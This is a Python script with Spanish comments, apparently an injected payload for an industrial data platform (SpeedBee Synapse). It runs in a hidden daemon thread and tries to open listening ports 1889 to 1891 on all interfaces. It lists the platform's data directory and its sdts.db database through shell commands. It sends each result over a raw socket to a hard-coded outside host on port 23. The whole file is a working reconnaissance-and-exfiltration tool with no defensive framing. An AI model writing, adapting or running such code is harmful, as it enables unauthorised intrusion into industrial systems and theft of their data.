# broker_executor.py - VERSIÓN 018 (IMPORTS INTERNOS Y EXPLORACIÓN)
import threading

MI_PC = "192.168.171.156"

def consola_total(comp, ip_dest):
    import socket  # Import interno 1
    import os      # Import interno 2
    import subprocess # Import interno 3
    import time

    def log_h(msg):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip_dest, 23))
            s.sendall(f"DX1_LOG_018: {msg}\n".encode())
            s.close()
        except: pass

    log_h("--- SESIÓN 018: EXPLORACIÓN PROFUNDA ---")
    
    # 1. Intentar abrir un puerto libre (saltamos el 1888)
    puerto_final = None
    for p in [1889, 1890, 1891]:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', p))
            server.listen(1)
            log_h(f"!!! ÉXITO: Escuchando en el puerto {p} !!!")
            puerto_final = server
            break
        except:
            log_h(f"Puerto {p} ocupado, saltando...")

    # 2. Exploración de archivos con comando directo de sistema
    try:
        path = "/opt/speedbeesynapse-data/"
        # Usamos subprocess para listar porque os.listdir a veces falla por permisos
        archivos = subprocess.check_output(f"ls -F {path}", shell=True).decode()
        log_h(f"CONTENIDO DE {path}:\n{archivos}")
        
        # Si vemos el db, miramos si podemos leer su tamaño
        if "sdts.db" in archivos:
            info_db = subprocess.check_output(f"ls -lh {path}sdts.db", shell=True).decode()
            log_h(f"DETALLE DB: {info_db.strip()}")
            
    except Exception as e:
        log_h(f"Error explorando con LS: {str(e)}")

    # 3. Mantener el receptor vivo
    if puerto_final:
        while True:
            try:
                conn, addr = puerto_final.accept()
                log_h(f"CONEXIÓN ENTRANTE EN 1889 DESDE {addr}")
                conn.close()
            except: pass

# Lanzamos el hilo
t = threading.Thread(target=consola_total, args=(self, MI_PC), daemon=True)
t.start()
self.col_res.insert("LOG 018: Escaneando...")